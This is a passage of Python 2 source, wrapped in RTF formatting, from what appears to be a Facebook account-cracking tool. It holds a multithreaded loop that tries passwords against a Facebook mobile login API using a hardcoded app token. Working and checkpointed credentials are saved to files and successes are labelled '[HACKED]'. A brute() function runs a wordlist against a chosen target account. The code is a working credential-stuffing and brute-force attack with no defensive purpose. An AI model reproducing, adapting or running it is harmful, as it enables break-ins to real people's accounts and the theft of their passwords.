\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab q = json.load(data)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab if 'access_token' in q:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;92m[OK] \\x1b[1;92m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;92m ' + pass7 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab oks.append(user+pass7)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab if 'www.facebook.com' in q["error_msg"]:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;36;40m[HACKED] \\x1b[1;97m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;97m ' + pass7 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek = open("out/CP.txt", "a")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.write(user+"|"+pass7+"\\n")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.close()\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cekpoint.append(user+pass7)\par
\tab\tab except:\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\par
\tab\tab\tab pass\par
\tab\tab\par
\tab p = ThreadPool(30)\par
\tab p.map(main, id) \par
\tab\par
\tab print '\\033[1;31;40m[\f2\u10003?\f0 ] Process Has Been Completed\\033[1;96m....'\par
\tab print "\\033[1;32;40m[+] Total OK/\\x1b[1;93mCP \\033[1;91m: \\033[1;91m"+str(len(oks))+"\\033[1;31;40m/\\033[1;36;40m"+str(len(cekpoint))\par
\tab print '\\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'\par
\tab print """\par
\\033[1;31;40m \f2\u9679?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\f7\u9668?\f2\u9658?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9679?\f0\par
           """\par
\tab raw_input("\\n\\033[1;96m[\\033[1;97mExit\\033[1;96m]")\par
\tab super()\par
\par
def brute():\par
    os.system('clear')\par
    try:\par
        toket = open('login.txt', 'r').read()\par
    except IOError:\par
        print '\\x1b[1;91m[!] Token not found'\par
        os.system('rm -rf login.txt')\par
        time.sleep(0.5)\par
        login()\par
    else:\par
        os.system('clear')\par
        print logo\par
        print '\\033[1;31;40m \f2\u9679?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\f7\u9668?\f2\u9658?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9679?\f0 '\par
        try:\par
            email = raw_input('\\x1b[1;91m[+] \\x1b[1;92mID\\x1b[1;97m/\\x1b[1;92mEmail \\x1b[1;97mTarget \\x1b[1;91m:\\x1b[1;97m ')\par
            passw = raw_input('\\x1b[1;91m[+] \\x1b[1;92mWordlist \\x1b[1;97mext(list.txt) \\x1b[1;91m: \\x1b[1;97m')\par
            total = open(passw, 'r')\par
            total = total.readlines()\par
            print '\\033[1;31;40m \f2\u9679?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\f7\u9668?\f2\u9658?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9679?\f0 '\par
            print '\\x1b[1;91m[\\x1b[1;96m\\xe2\\x9c\\x93\\x1b[1;91m] \\x1b[1;92mTarget \\x1b[1;91m:\\x1b[1;97m ' + email\par
            print '\\x1b[1;91m[+] \\x1b[1;92mTotal\\x1b[1;96m ' + str(len(total)) + ' \\x1b[1;92mPassword'\par
            jalan('\\x1b[1;91m[\\xe2\\x9c\\xba] \\x1b[1;92mPlease wait \\x1b[1;97m...')\par
            sandi = open(passw, 'r')\par
            for pw in sandi:\par
                try:\par
                    pw = pw.replace('\\n', '')\par
                    sys.stdout.write('\\r\\x1b[1;91m[\\x1b[1;96m\\xe2\\x9c\\xb8\\x1b[1;91m] \\x1b[1;92mTry \\x1b[1;97m' + pw)\par
                    sys.stdout.flush()\par
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')\par
                    mpsh = json.loads(data.text)\par
                    if 'access_token' in mpsh:\par
                        dapat = open('Brute.txt', 'w')\par
                        dapat.write(email + ' | ' + pw + '\\n')\par
                        dapat.close()\par
                        print '\\n\\x1b[1;91m[+] \\x1b[1;92mFounded.'\par
                        print 52 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
                        print '\\x1b[1;91m[\\xe2\\x9e\\xb9] \\x1b[1;92mUsername \\x1b[1;91m:\\x1b[1;97m ' + email\par
                        print '\\x1b[1;91m[\\xe2\\x9e\\xb9] \\x1b[1;92mPassword \\x1b[1;91m:\\x1b[1;97m ' + pw\par
                        keluar()\par
                    else:\par
                        if 'www.facebook.com' in mpsh['error_msg']:\par
                            ceks = open('Brutecekpoint.txt', 'w')\par
                            ceks.write(email + ' | ' + pw + '\\n')\par
                            ceks.close()\par
                            print '\\n\\x1b[1;91m[+] \\x1b[1;92mFounded.'\par
                            print  "\\033[1;36;40m \f2\u9679?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\f7\u9668?\f2\u9658?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9679?\f0 "\par
                            print '\\x1b[1;91m[!] \\x1b[1;93mAccount Maybe Checkpoint'\par
                            print '\\x1b[1;91m[\\xe2\\x9e\\xb9] \\x1b[1;92mUsername \\x1b[1;91m:\\x1b[1;97m ' + email\par
                            print '\\x1b[1;91m[\\xe2\\x9e\\xb9] \\x1b[1;92mPassword \\x1b[1;91m:\\x1b[1;97m ' + pw\par
                            keluar()\par
                except requests.exceptions.ConnectionError:\par
                    print '\\x1b[1;91m[!] Connection Error'\par
                    time.sleep(1)\par
\par
        except IOError:\par
            print '\\x1b[1;91m[!] File not found...'\par
            print """\\n\\x1b[1;91m[!] \\x1b[1;92mLooks like you don't have a wordlist"""\par
            super()\par
\par
if __name__ == '__main__':\par
\tab login()\par
\par
\lang1033\par
}
 